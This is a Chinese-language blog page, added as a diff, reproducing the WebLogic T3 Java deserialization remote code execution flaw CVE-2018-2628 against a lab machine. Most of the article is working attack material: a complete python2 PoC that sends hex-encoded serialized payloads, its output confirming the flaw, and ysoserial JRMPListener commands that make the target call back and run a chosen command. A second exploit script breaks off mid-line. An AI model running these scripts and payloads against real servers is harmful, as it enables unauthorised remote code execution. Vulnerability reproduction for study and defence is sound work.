@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言weblogic的最后一个漏洞，Java反序列化，以前没学过Java，也没学过Java反序列化。。。。 Java序列化与反序列化Java序列化： 即把Java对象转换为字节序列的过程 Java反序列化： 是指把字节序列恢复为Java对象的过程 目的： 为了让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信，对象持久化存储 相关历史漏洞 CVE-2015-4852Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic复现之Java反序列化">
+<meta property="og:url" content="http://mysecroad.github.io/posts/37247.html">
+<meta property="og:site_name" content="忆时光">
+<meta property="og:description" content="前言weblogic的最后一个漏洞，Java反序列化，以前没学过Java，也没学过Java反序列化。。。。 Java序列化与反序列化Java序列化： 即把Java对象转换为字节序列的过程 Java反序列化： 是指把字节序列恢复为Java对象的过程 目的： 为了让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信，对象持久化存储 相关历史漏洞 CVE-2015-4852Web">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://mysecroad.github.io/posts/37247/1.jpg">
+<meta property="og:image" content="http://mysecroad.github.io/posts/37247/2.png">
+<meta property="og:image" content="http://mysecroad.github.io/posts/37247/3.png">
+<meta property="article:published_time" content="2019-07-28T01:28:04.000Z">
+<meta property="article:modified_time" content="2019-08-19T07:39:18.000Z">
+<meta property="article:author" content="ca5tle">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mysecroad.github.io/posts/37247/1.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Weblogic复现之Java反序列化</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/21635.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/29626.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://mysecroad.github.io/posts/37247.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://mysecroad.github.io/posts/37247.html&text=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mysecroad.github.io/posts/37247.html&is_video=false&description=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic复现之Java反序列化&body=Check out this article: http://mysecroad.github.io/posts/37247.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://mysecroad.github.io/posts/37247.html&title=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://mysecroad.github.io/posts/37247.html&name=Weblogic复现之Java反序列化&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://mysecroad.github.io/posts/37247.html&t=Weblogic复现之Java反序列化" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java序列化与反序列化"><span class="toc-number">1.1.</span> <span class="toc-text">Java序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关历史漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">相关历史漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#涉及版本"><span class="toc-number">1.3.</span> <span class="toc-text">涉及版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一"><span class="toc-number">2.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二"><span class="toc-number">2.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Weblogic复现之Java反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ca5tle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-28T01:28:04.000Z" itemprop="datePublished">2019-07-28</time>
+        
+        (Updated: <time datetime="2019-08-19T07:39:18.000Z" itemprop="dateModified">2019-08-19</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>weblogic的最后一个漏洞，Java反序列化，以前没学过Java，也没学过Java反序列化。。。。</p>
+<h2 id="Java序列化与反序列化"><a href="#Java序列化与反序列化" class="headerlink" title="Java序列化与反序列化"></a>Java序列化与反序列化</h2><p>Java序列化： 即把Java对象转换为字节序列的过程</p>
+<p>Java反序列化： 是指把字节序列恢复为Java对象的过程</p>
+<p>目的： 为了让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信，对象持久化存储</p>
+<h2 id="相关历史漏洞"><a href="#相关历史漏洞" class="headerlink" title="相关历史漏洞"></a>相关历史漏洞</h2><ul>
+<li>CVE-2015-4852<br>Weblogic 直接反序列化<br>是基于Weblogic t3协议引起远程代码执行的反序列化漏洞 </li>
+<li>CVE-2016-0638<br>Weblogic 直接反序列化<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 漏洞实为CVE-2015-4852绕过 拜Oracle一直以来的黑名单修复方式所赐 </li>
+<li>CVE-2016-3510<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 </li>
+<li>CVE-2017-3248<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于Weblogic JRMP反序列化 </li>
+<li>CVE-2018-2628<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 属于 Weblogic JRMP反序列化 </li>
+<li>CVE-2018-2893<br>基于Weblogic t3协议引起远程代码执行的反序列化漏洞 实为CVE-2018-2628绕过 同样拜Oracle一直以来的黑名单修复方式所赐 属于Weblogic JRMP反序列化</li>
+</ul>
+<h2 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10.3.6.0</span><br><span class="line">12.1.3.0</span><br><span class="line">12.2.1.2</span><br><span class="line">12.2.1.3</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ol>
+<li><p>nmap探测目标信息，是否正在使用T3协议</p>
+<p><code>nmap -n -v -p 7001 192.168.220.141 --script=weblogic-t3-info</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">7001&#x2F;tcp open  afs3-callback</span><br><span class="line">|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用python脚本探测目标是否存在Java反序列化漏洞</p>
+<p>探测脚本：(基于python2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># FileName:     weblogic_poc.py</span><br><span class="line">#先进行T3的握手，成功了就发送第一步的payload，然后发送RequestObject，尝试让weblogic反连自己，然后发送恶意数据，通过回显判定恶意特征串来判定是否存在漏洞</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">socket.setdefaulttimeout(5)</span><br><span class="line">VUL&#x3D;[&#39;CVE-2018-2628&#39;]</span><br><span class="line">PAYLOAD&#x3D;[&#39;aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078&#39;]</span><br><span class="line">VER_SIG&#x3D;[&#39;\\$Proxy[0-9]+&#39;]</span><br><span class="line">def t3handshake(sock,server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sock.recv(1024)</span><br><span class="line">    #print &#39;handshake successful&#39;</span><br><span class="line">def buildT3RequestObject(sock,port):</span><br><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span><br><span class="line">    data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;.format(&#39;&#123;:04x&#125;&#39;.format(dport))</span><br><span class="line">    data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span><br><span class="line">    data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span><br><span class="line">    for d in [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    #print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span><br><span class="line">def sendEvilObjData(sock,data):</span><br><span class="line">	payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span><br><span class="line">    payload+&#x3D;data</span><br><span class="line">    payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span><br><span class="line">    payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    count &#x3D; 1024</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            res +&#x3D; sock.recv(4096)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            count -&#x3D; 1</span><br><span class="line">            if count &lt;&#x3D; 0:</span><br><span class="line">                break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        pass</span><br><span class="line">    return res</span><br><span class="line">def checkVul(res,server_addr,index):</span><br><span class="line">    p&#x3D;re.findall(VER_SIG[index], res, re.S)</span><br><span class="line">    if len(p)&gt;0:</span><br><span class="line">        #print &#39;%s:%d is vul %s&#39;%(server_addr[0],server_addr[1],VUL[index])</span><br><span class="line">        return True</span><br><span class="line">    return False </span><br><span class="line">def do_run(dip,dport,index):</span><br><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span><br><span class="line">    sock.settimeout(25)</span><br><span class="line">    server_addr &#x3D; (dip, dport)</span><br><span class="line">    t3handshake(sock, server_addr)</span><br><span class="line">    buildT3RequestObject(sock, dport)</span><br><span class="line">    rs&#x3D;sendEvilObjData(sock, PAYLOAD[index])</span><br><span class="line">    #print &#39;rs&#39;,rs</span><br><span class="line">    return checkVul(rs, server_addr, index)</span><br><span class="line">def run(url, port):</span><br><span class="line">    try:</span><br><span class="line">        res &#x3D; do_run(url, port, 0)</span><br><span class="line">        if res:</span><br><span class="line">            out &#x3D; &#123;</span><br><span class="line">            &#39;结果&#39;: &#39;存在WebLogic CVE-2018-2628 反序列化RCE漏洞&#39;,</span><br><span class="line">            &#39;url&#39;: &#39;%s:%s&#39; % (url, port),</span><br><span class="line">            &#125; </span><br><span class="line">            return json.dumps(out, encoding&#x3D;&#39;utf8&#39;, ensure_ascii &#x3D; False)</span><br><span class="line">        return False</span><br><span class="line">    except Exception ,e:</span><br><span class="line">        print &quot;[!] &quot;, e</span><br><span class="line">    return False</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    dip &#x3D; sys.argv[1]</span><br><span class="line">    dport &#x3D; 7001</span><br><span class="line">    print run(dip,dport)</span><br></pre></td></tr></table></figure>
+
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# python weblogic_poc.py 192.168.220.141</span><br><span class="line">&#123;&quot;url&quot;: &quot;192.168.220.141:7001&quot;, &quot;结果&quot;: &quot;存在WebLogic CVE-2018-2628 反序列化RCE漏洞&quot;&#125;</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>根据前面探测的信息，发现目标存在Java反序列化漏洞</p>
+<p>我们需要使用“ysoserial”这个工具: <a href="https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar" target="_blank" rel="noopener">https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</a></p>
+<p>首先使用ysoserial在攻击机上启动一个JRMP server，输入一下命令</p>
+<p> <code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</code></p>
+<p><code>[listen port]: 攻击机要监听的端口 [command]: 想要执行的命令</code></p>
+<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7089 CommonsCollections1 &quot;touch /tmp/test.bat&quot;</code></p>
+<p>使用python脚本向目标发送数据包，该脚本会让靶机调用相关服务来访问我们启动的JRMP server，执行我们想要的命令</p>
+<p>脚本：(基于python2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import print_function</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    #generates ysoserial payload</span><br><span class="line">    command &#x3D; &#39;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#39;.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    print(&quot;command: &quot; + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file &#x3D; open(&#39;payload.out&#39;,&#39;rb&#39;).read()</span><br><span class="line">    return binascii.hexlify(bin_file)</span><br><span class="line">def t3_handshake(sock, server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    sock.recv(1024)</span><br><span class="line">    print(&#39;handshake successful&#39;)</span><br><span class="line">def build_t3_request_object(sock, port):</span><br><span class="line">    data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span><br><span class="line">    data2 